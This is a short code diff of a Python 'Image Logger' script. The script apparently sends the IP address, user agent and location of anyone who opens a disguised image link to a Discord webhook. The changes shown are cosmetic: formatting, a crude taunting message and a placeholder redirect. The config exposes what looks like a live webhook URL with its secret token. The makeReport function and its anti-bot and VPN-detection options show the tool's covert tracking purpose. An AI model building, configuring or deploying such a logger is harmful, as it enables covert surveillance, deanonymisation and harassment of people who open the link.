@@ -15,8 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m",
     "image": "https://m.media-amazon.com/images/I/81f5juHXlrL._AC_UF1000,1000_QL80_.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True,
-    # Allows you to use a URL argument to change the image (SEE THE README)
+   "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
@@ -29,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "by_samxara run pusssssssssssy", # Message to show
+        "message": "by_samxara run pusssssssssssssssssssssssy", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -52,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://www.youtube.com/watch?v=RAZSdO2DA3E&list=RDR8bcRRN0Gj0&index=2" # Link to the webpage to redirect to 
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -87,8 +86,7 @@ def reportError(error):
         }
     ],
 })
-    
-    
+
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
@@ -118,7 +116,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         
         if config["vpnCheck"] == 1:
             ping = ""
-
+    
     if info["hosting"]:
         if config["antiBot"] == 4:
             if info["proxy"]:
